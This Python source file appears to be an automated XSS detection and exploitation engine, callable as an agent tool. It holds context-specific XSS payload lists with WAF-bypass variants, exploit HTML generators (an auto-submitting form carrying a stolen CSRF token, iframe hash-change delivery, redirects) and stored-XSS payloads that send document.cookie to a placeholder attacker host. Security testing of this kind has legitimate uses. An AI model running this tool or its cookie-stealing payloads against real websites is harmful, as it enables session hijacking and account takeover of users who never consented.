"""
Hunter v5 — Auto XSS Engine (Enhanced)

Automates XSS detection and exploitation:
1. Context detection (HTML/Attribute/JS/URL)
2. Payload selection based on context
3. WAF bypass
4. DOM analysis for DOM-based XSS
5. Stored XSS detection (POST inject → GET verify)
6. Encoding analysis and bypass
"""

import re
import time
from typing import Optional

try:
    from tools.probe import _get_session
except (ImportError, ModuleNotFoundError):
    import requests
    def _get_session():
        s = requests.Session()
        s.verify = False
        s.headers.update({'User-Agent': 'Mozilla/5.0'})
        return s


class AutoXSS:
    """Automated XSS detection and exploitation engine."""

    def __init__(self, base_url: str, param: str = "q",
                 method: str = "GET", session=None, headers: dict = None,
                 csrf_url: str = ""):
        self.base_url = base_url
        self.param = param
        self.method = method.upper()
        self.session = session or _get_session()
        self.extra_headers = headers or {}
        self.csrf_url = csrf_url  # URL to GET for CSRF token extraction
        self.csrf_token = ""
        self.context = None
        self.payloads_tested = []
        self.vulnerable = False
        self.working_payload = None
        self.xss_type = None  # reflected, dom, stored
        self.baseline_response = None
        self.evidence = None

    def _request_record(self, payload: str) -> dict:
        if self.method == "GET":
            from urllib.parse import quote
            return {"method": "GET", "url": f"{self.base_url}?{self.param}={quote(payload)}", "headers": dict(getattr(self, "extra_headers", {})), "body": ""}
        return {"method": self.method, "url": self.base_url, "headers": dict(getattr(self, "extra_headers", {})), "body": {self.param: payload}}

    def _build_evidence(self, payload: str, response: dict, reproduction_count: int) -> dict:
        baseline = self.baseline_response or {}
        metadata = {
            "response_time": response.get("time", 0),
            "baseline_response_time": baseline.get("time", 0),
        }
        return {
            "request": self._request_record(payload),
            "response": {"status_code": response.get("status", 0), "headers": response.get("headers", {}), "body": response.get("body", "")},
            "baseline_response": {"status_code": baseline.get("status", 0), "headers": baseline.get("headers", {}), "body": baseline.get("body", "")},
            "payload": payload,
            "reproduction_count": reproduction_count,
            "metadata": metadata,
        }

    def _ensure_baseline(self) -> dict:
        if self.baseline_response is None:
            self.baseline_response = self._test_payload("HUNTER_XSS_BASELINE_7392")
        return self.baseline_response

    def _confirm_evidence(self, payload: str, first_response: dict) -> dict:
        from core.evidence.verdict_engine import Verdict, VerdictEngine, VulnType

        responses = [first_response]
        responses.extend(self._test_payload(payload) for _ in range(2))
        confirmed = 0
        for response in responses:
            item = self._build_evidence(payload, response, 1)
            if VerdictEngine().assess(VulnType.XSS, item).verdict in {Verdict.LIKELY, Verdict.VERIFIED}:
                confirmed += 1
        evidence = self._build_evidence(payload, first_response, confirmed)
        self.evidence = evidence
        return evidence

    def _test_payload(self, payload: str, url: str = None, method: str = None,
                      headers: dict = None) -> dict:
        """Send payload and analyze response."""
        try:
            target_url = url or self.base_url
            m = method or self.method
            h = {**self.extra_headers, **(headers or {})}

            if m == "GET":
                from urllib.parse import quote
                full_url = f"{target_url}?{self.param}={quote(payload)}"
                resp = self.session.get(full_url, headers=h, timeout=10, allow_redirects=False)
            else:
                resp = self.session.post(target_url, data={self.param: payload},
                                         headers=h, timeout=10, allow_redirects=False)

            reflected = payload in resp.text
            encoded = self._check_encoding(payload, resp.text)

            return {
                "status": resp.status_code,
                "body": resp.text,
                "length": len(resp.text),
                "reflected": reflected,
                "encoded": encoded,
                "payload": payload,
            }
        except Exception as e:
            return {"status": 0, "error": str(e), "reflected": False}

    def _check_encoding(self, payload: str, body: str) -> dict:
        """Check how the payload was encoded in the response."""
        encodings = {}

        if "<" in payload:
            if "&lt;" in body and "<" not in body.split(payload)[0][-50:]:
                encodings["html_entities"] = True
            if payload in body:
                encodings["none"] = True

        if '"' in payload:
            if "&quot;" in body:
                encodings["quotes_encoded"] = True

        if "\\x3c" in body or "\\u003c" in body:
            encodings["js_encoding"] = True

        return encodings

    def _extract_csrf(self):
        """Extract CSRF token from form page."""
        try:
            resp = self.session.get(self.csrf_url, timeout=10)
            match = re.search(r'name="csrf"[^>]*value="([^"]+)"', resp.text)
            if match:
                self.csrf_token = match.group(1)
        except Exception:
            pass

    def generate_exploit_html(self, payload: str, xss_type: str = "reflected") -> str:
        """Generate exploit HTML for delivering XSS payload.

        Args:
            payload: The XSS payload to deliver
            xss_type: 'reflected', 'stored', 'dom_hashchange'
        """
        if xss_type == "dom_hashchange":
            # DOM XSS via jQuery hashchange: iframe + delayed hash change
            return (
                f'<iframe id="f" src="{self.base_url}"></iframe>'
                f'<script>setTimeout(function(){{'
                f'document.getElementById("f").src="{self.base_url}#{payload}";'
                f'}},3000);</script>'
            )
        elif xss_type == "stored":
            # Stored XSS: auto-submit form with payload
            return (
                f'<form id="f" action="{self.base_url}" method="POST">'
                f'<input type="hidden" name="csrf" value="{self.csrf_token}">'
                f'<input type="hidden" name="{self.param}" value="{payload}">'
                f'</form>'
                f'<script>document.getElementById("f").submit();</script>'
            )
        else:
            # Reflected XSS: direct URL with payload
            from urllib.parse import quote
            return f'<script>location="{self.base_url}?{self.param}={quote(payload)}";</script>'

    def detect_context(self) -> str:
        """Detect where user input appears in the response."""
        marker = "HUNTERXSS12345"
        result = self._test_payload(marker)
        body = result.get("body", "")

        idx = body.find(marker)
        if idx == -1:
            self.context = "not_reflected"
            return "not_reflected"

        before = body[max(0, idx-100):idx]
        after = body[idx+len(marker):idx+len(marker)+100]

        # Attribute context
        if re.search(r'=\s*["\']?$', before) or re.search(r'^["\']', after):
            self.context = "attribute"
            return "attribute"

        # JavaScript context
        if "var " in before or "= '" in before or "= \"" in before:
            self.context = "javascript"
            return "javascript"

        # HTML tag context
        if "<" in before and ">" not in before[-50:]:
            self.context = "html_tag"
            return "html_tag"

        # URL context (href, src)
        if "href=" in before or "src=" in before:
            self.context = "href"
            return "href"

        # jQuery selector context
        if "$(" in before or "jQuery(" in before:
            self.context = "jquery_selector"
            return "jquery_selector"

        # Default: HTML context
        self.context = "html"
        return "html"

    def detect_dom_xss(self, js_url: str = "") -> dict:
        """Detect DOM-based XSS by analyzing JavaScript sources."""
        results = {"dom_sources": [], "dom_sinks": [], "vulnerable": False}

        # DOM XSS sources (user-controllable)
        sources = [
            "document.URL", "document.documentURI", "document.referrer",
            "location.search", "location.hash", "location.href",
            "window.location", "document.cookie", "window.name",
            "postMessage", "localStorage", "sessionStorage",
        ]

        # DOM XSS sinks (dangerous functions)
        sinks = [
            ("document.write", "high"),
            ("innerHTML", "high"),
            ("outerHTML", "high"),
            ("eval(", "critical"),
            ("setTimeout(", "high"),
            ("setInterval(", "high"),
            ("Function(", "critical"),
            ("insertAdjacentHTML", "high"),
            ("$.html(", "high"),
            ("$.append(", "medium"),
            ("$.prepend(", "medium"),
            ("$.after(", "medium"),
            ("$.before(", "medium"),
            ("$.replaceWith(", "medium"),
            ("document.writeln", "high"),
            ("location.href =", "high"),
            ("location.assign(", "high"),
            ("location.replace(", "high"),
            ("window.open(", "medium"),
        ]

        # Fetch and analyze JS files
        js_content = ""
        try:
            if js_url:
                resp = self.session.get(js_url, timeout=10)
                js_content = resp.text
            else:
                # Try to get page and extract inline scripts
                resp = self.session.get(self.base_url, timeout=10)
                # Extract inline scripts
                script_pattern = re.compile(r'<script[^>]*>(.*?)</script>', re.DOTALL | re.IGNORECASE)
                scripts = script_pattern.findall(resp.text)
                js_content = "\n".join(scripts)

                # Extract external script URLs and fetch them
                src_pattern = re.compile(r'<script[^>]*src=["\']([^"\']+)["\']', re.IGNORECASE)
                src_urls = src_pattern.findall(resp.text)
                for src in src_urls[:5]:  # Limit to 5 external scripts
                    if src.startswith("//"):
                        src = "https:" + src
                    elif src.startswith("/"):
                        from urllib.parse import urlparse
                        parsed = urlparse(self.base_url)
                        src = f"{parsed.scheme}://{parsed.netloc}{src}"
                    try:
                        js_resp = self.session.get(src, timeout=5)
                        js_content += "\n" + js_resp.text
                    except Exception:
                        continue
        except Exception:
            return {"error": "Failed to fetch JavaScript", "vulnerable": False}

        # Search for sources
        for source in sources:
            if source in js_content:
                results["dom_sources"].append(source)

        # Search for sinks
        for sink, severity in sinks:
            if sink in js_content:
                results["dom_sinks"].append({"sink": sink, "severity": severity})

        # Check for source-to-sink flows (simple heuristic)
        if results["dom_sources"] and results["dom_sinks"]:
            high_sinks = [s for s in results["dom_sinks"] if s["severity"] in ("critical", "high")]
            if high_sinks:
                results["vulnerable"] = True
                results["severity"] = "high"
                results["detail"] = f"Found {len(results['dom_sources'])} sources and {len(high_sinks)} high-severity sinks"

                # Generate test payloads
                test_payloads = []
                for source in results["dom_sources"]:
                    if "hash" in source.lower():
                        test_payloads.append(f"javascript:{self.base_url}#<img src=x onerror=alert(1)>")
                    elif "search" in source.lower() or "URL" in source:
                        test_payloads.append(f"<img src=x onerror=alert(1)>")

                results["test_payloads"] = test_payloads

        return results

    def test_stored_xss(self, inject_url: str, verify_url: str = "",
                        inject_method: str = "POST", verify_method: str = "GET",
                        extra_params: dict = None) -> dict:
        """Test for stored XSS by injecting and verifying."""
        if not verify_url:
            verify_url = self.base_url

        marker = f"<img src=x onerror=alert('HUNTER{int(time.time())}')>"
        results = {"injected": False, "reflected": False, "vulnerable": False}

        # Inject payload
        try:
            h = {**self.extra_headers, "Content-Type": "application/x-www-form-urlencoded"}
            data = {self.param: marker}
            if extra_params:
                data.update(extra_params)

            if inject_method.upper() == "POST":
                inject_resp = self.session.post(inject_url, data=data, headers=h, timeout=10)
            else:
                inject_resp = self.session.get(inject_url, params=data, headers=h, timeout=10)

            results["inject_status"] = inject_resp.status_code
            results["injected"] = inject_resp.status_code in (200, 201, 301, 302)
        except Exception as e:
            results["inject_error"] = str(e)
            return results

        # Verify on different page
        if results["injected"]:
            time.sleep(1)  # Wait for storage
            try:
                verify_resp = self.session.get(verify_url, headers=self.extra_headers, timeout=10)
                if marker in verify_resp.text:
                    results["reflected"] = True
                    results["vulnerable"] = True
                    self.vulnerable = True
                    self.xss_type = "stored"
                    self.working_payload = marker
                    results["verify_status"] = verify_resp.status_code

                    # Test with more dangerous payloads
                    exploit_payloads = [
                        "<script>document.location='http://HUNTER_OOB/?c='+document.cookie</script>",
                        "<img src=x onerror=fetch('http://HUNTER_OOB/?c='+document.cookie)>",
                    ]
                    results["exploit_payloads"] = exploit_payloads
            except Exception as e:
                results["verify_error"] = str(e)

        return results

    def get_payloads_for_context(self, context: str, waf_detected: bool = False) -> list:
        """Get XSS payloads for the detected context."""
        payloads = {
            "html": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<body onload=alert(1)>",
                "<video src=x onerror=alert(1)>",
                "<audio src=x onerror=alert(1)>",
                "<marquee onstart=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<math><mtext></mtext><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>",
                "<xss id=x tabindex=1 onfocus=alert(1)></xss>",
            ],
            "attribute": [
                "\" autofocus onfocus=alert(1) \"",
                "\" onmouseover=alert(1) \"",
                "' onfocus=alert(1) autofocus '",
                "\" onfocus=alert(1) autofocus \"",
                "\" onmouseover=alert(1) x=\"",
                "'-alert(1)-'",
                "\";alert(1);//",
                "\" onclick=alert(1) x=\"",
                "' onfocus=alert(1) autofocus '",
                "\" accesskey=x onclick=alert(1) \"",
            ],
            "javascript": [
                "';alert(1);//",
                "\";alert(1);//",
                "</script><script>alert(1)</script>",
                "-alert(1)-",
                "{{constructor.constructor('alert(1)')()}}",
                "'-alert(1)-'",
                "\\'-alert(1)-//",
                "\\x3c/script\\x3e\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
            ],
            "html_tag": [
                "><script>alert(1)</script>",
                "><img src=x onerror=alert(1)>",
                " onmouseover=alert(1) ",
                " autofocus onfocus=alert(1) ",
                " onload=alert(1) ",
            ],
            "href": [
                "javascript:alert(1)",
                "javascript:alert(document.cookie)",
                "data:text/html,<script>alert(1)</script>",
                "javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            ],
            "jquery_selector": [
                "#<img src=x onerror=alert(1)>",
                "#<svg onload=alert(1)>",
                "#<body onload=alert(1)>",
            ],
            "dom_innerhtml": [
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<body onload=alert(1)>",
            ],
            "dom_documentwrite": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
            ],
        }

        result = payloads.get(context, payloads["html"])

        if waf_detected:
            result.extend([
                "<img src=x onerror=alert`1`>",
                "<svg/onload=alert(1)>",
                "${alert(1)}",
                "javascript:alert(1)",
                "<details open ontoggle=alert(1)>",
                "<marquee onstart=alert(1)>",
                "<video src=x onerror=alert(1)>",
                "<audio src=x onerror=alert(1)>",
                "'-alert(1)-'",
                "<img/src=x onerror=alert(1)>",
                "<svg onload=alert&#40;1&#41;>",
                "<svg onload = alert(1)>",
            ])

        return result

    def detect_waf(self) -> bool:
        """Quick WAF detection for XSS."""
        result = self._test_payload("<script>alert(1)</script>")
        body = result.get("body", "").lower()

        waf_indicators = ["blocked", "forbidden", "waf", "firewall", "security",
                         "not acceptable", "request rejected"]
        return any(ind in body for ind in waf_indicators) or result.get("status") in (403, 406, 429)

    def run_full_scan(self, dom_check: bool = True,
                      stored_url: str = "", stored_params: dict = None) -> dict:
        """Run complete automated XSS scan."""
        start = time.time()
        results = {
            "target": self.base_url,
            "param": self.param,
            "steps": [],
        }
        self._ensure_baseline()

        # Step 1: Detect context
        context = self.detect_context()
        results["context"] = context
        results["steps"].append({"step": "context_detection", "result": context})

        if context == "not_reflected":
            results["conclusion"] = "Input not reflected in response"

            # Still check DOM XSS
            if dom_check:
                dom_result = self.detect_dom_xss()
                results["dom_xss"] = dom_result
                results["steps"].append({"step": "dom_xss", "result": dom_result})
                if dom_result.get("vulnerable"):
                    self.vulnerable = True
                    self.xss_type = "dom"

            # Check stored XSS if URL provided
            if stored_url:
                stored_result = self.test_stored_xss(
                    inject_url=stored_url,
                    extra_params=stored_params,
                )
                results["stored_xss"] = stored_result
                results["steps"].append({"step": "stored_xss", "result": stored_result})

            results["vulnerable"] = self.vulnerable
            results["xss_type"] = self.xss_type
            results["elapsed_ms"] = int((time.time() - start) * 1000)
            return results

        # Step 2: WAF detection
        waf = self.detect_waf()
        results["waf_detected"] = waf
        results["steps"].append({"step": "waf_detection", "result": waf})

        # Step 3: Test payloads for reflected XSS
        payloads = self.get_payloads_for_context(context, waf)
        results["payloads_tested"] = len(payloads)

        for payload in payloads:
            result = self._test_payload(payload)
            self.payloads_tested.append(result)

            if result.get("reflected") and not result.get("encoded", {}).get("html_entities"):
                self.vulnerable = True
                self.working_payload = payload
                self.xss_type = "reflected"
                results["vulnerable"] = True
                results["working_payload"] = payload
                results["xss_type"] = "reflected"
                results["steps"].append({
                    "step": "payload_test",
                    "result": {"payload": payload, "reflected": True, "encoded": result.get("encoded")},
                })
                break

        # Step 4: DOM XSS check
        if dom_check:
            dom_result = self.detect_dom_xss()
            results["dom_xss"] = dom_result
            results["steps"].append({"step": "dom_xss", "result": dom_result})
            if dom_result.get("vulnerable") and not self.vulnerable:
                self.vulnerable = True
                self.xss_type = "dom"

        # Step 5: Stored XSS check
        if stored_url:
            stored_result = self.test_stored_xss(
                inject_url=stored_url,
                extra_params=stored_params,
            )
            results["stored_xss"] = stored_result
            results["steps"].append({"step": "stored_xss", "result": stored_result})

        if not self.vulnerable:
            results["vulnerable"] = False
            results["conclusion"] = "No unencoded reflection found. May need manual testing."

        if self.working_payload:
            first_response = self._test_payload(self.working_payload)
            results["evidence"] = self._confirm_evidence(self.working_payload, first_response)

        results["xss_type"] = self.xss_type
        results["elapsed_ms"] = int((time.time() - start) * 1000)
        return results


def auto_xss_impl(base_url: str, param: str = "q", method: str = "GET",
                   dom_check: bool = True, stored_url: str = "",
                   stored_params: dict = None, headers: dict = None) -> dict:
    """Run automated XSS scan. Entry point for MCP tool."""
    engine = AutoXSS(base_url, param, method, headers=headers)
    return engine.run_full_scan(dom_check=dom_check, stored_url=stored_url,
                                 stored_params=stored_params)
